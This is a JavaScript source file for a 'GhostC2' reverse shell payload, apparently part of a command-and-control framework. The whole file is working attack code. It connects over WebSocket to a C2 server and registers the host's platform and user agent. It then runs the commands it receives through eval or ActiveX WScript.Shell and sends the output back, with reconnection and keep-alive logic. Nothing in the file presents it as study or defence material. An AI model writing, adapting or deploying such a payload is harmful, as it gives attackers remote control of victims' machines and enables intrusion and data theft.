// GhostC2 JavaScript Reverse Shell Payload
// This payload establishes a reverse shell connection via WebSocket

(function() {
    'use strict';
    
    const SERVER_URL = 'ws://localhost:8080/ws';
    const AGENT_ID = 'js_agent_' + Math.random().toString(36).substr(2, 9);
    
    let ws = null;
    let reconnectAttempts = 0;
    const MAX_RECONNECT_ATTEMPTS = 5;
    
    // Utility functions
    const log = (msg) => console.log(`[GhostC2] ${msg}`);
    const error = (msg) => console.error(`[GhostC2] ${msg}`);
    
    // Execute command using various methods
    function executeCommand(command) {
        return new Promise((resolve) => {
            let output = '';
            
            try {
                // Try using eval for JavaScript commands
                if (command.startsWith('js:')) {
                    const jsCode = command.substring(3);
                    const result = eval(jsCode);
                    output = String(result);
                }
                // Try using ActiveXObject for Windows (if available)
                else if (typeof ActiveXObject !== 'undefined') {
                    const shell = new ActiveXObject('WScript.Shell');
                    const exec = shell.Exec(command);
                    output = exec.StdOut.ReadAll() + exec.StdErr.ReadAll();
                }
                // Fallback to basic JavaScript execution
                else {
                    output = `Command execution not supported in this environment: ${command}`;
                }
            } catch (e) {
                output = `Error executing command: ${e.message}`;
            }
            
            resolve(output);
        });
    }
    
    // Send result to server
    function sendResult(command, output) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            const message = {
                type: 'result',
                agent_id: AGENT_ID,
                command: command,
                output: output,
                timestamp: new Date().toISOString()
            };
            ws.send(JSON.stringify(message));
        }
    }
    
    // Connect to server
    function connect() {
        try {
            ws = new WebSocket(SERVER_URL);
            
            ws.onopen = function() {
                log('Connected to GhostC2 server');
                reconnectAttempts = 0;
                
                // Register agent
                const registerMsg = {
                    type: 'register',
                    agent_id: AGENT_ID,
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };
                ws.send(JSON.stringify(registerMsg));
            };
            
            ws.onmessage = function(event) {
                try {
                    const message = JSON.parse(event.data);
                    
                    if (message.type === 'command') {
                        log(`Received command: ${message.command}`);
                        
                        executeCommand(message.command).then(output => {
                            sendResult(message.command, output);
                        });
                    }
                } catch (e) {
                    error(`Failed to parse message: ${e.message}`);
                }
            };
            
            ws.onclose = function() {
                log('Connection closed');
                scheduleReconnect();
            };
            
            ws.onerror = function(error) {
                error(`WebSocket error: ${error}`);
            };
            
        } catch (e) {
            error(`Failed to connect: ${e.message}`);
            scheduleReconnect();
        }
    }
    
    // Schedule reconnection
    function scheduleReconnect() {
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
            reconnectAttempts++;
            const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
            log(`Reconnecting in ${delay}ms (attempt ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})`);
            
            setTimeout(connect, delay);
        } else {
            error('Max reconnection attempts reached');
        }
    }
    
    // Initialize payload
    function init() {
        log('GhostC2 JavaScript payload initializing...');
        log(`Agent ID: ${AGENT_ID}`);
        log(`Platform: ${navigator.platform}`);
        log(`User Agent: ${navigator.userAgent}`);
        
        // Start connection
        connect();
        
        // Keep alive ping
        setInterval(() => {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'ping',
                    agent_id: AGENT_ID,
                    timestamp: new Date().toISOString()
                }));
            }
        }, 30000);
    }
    
    // Start the payload
    init();
    
})();
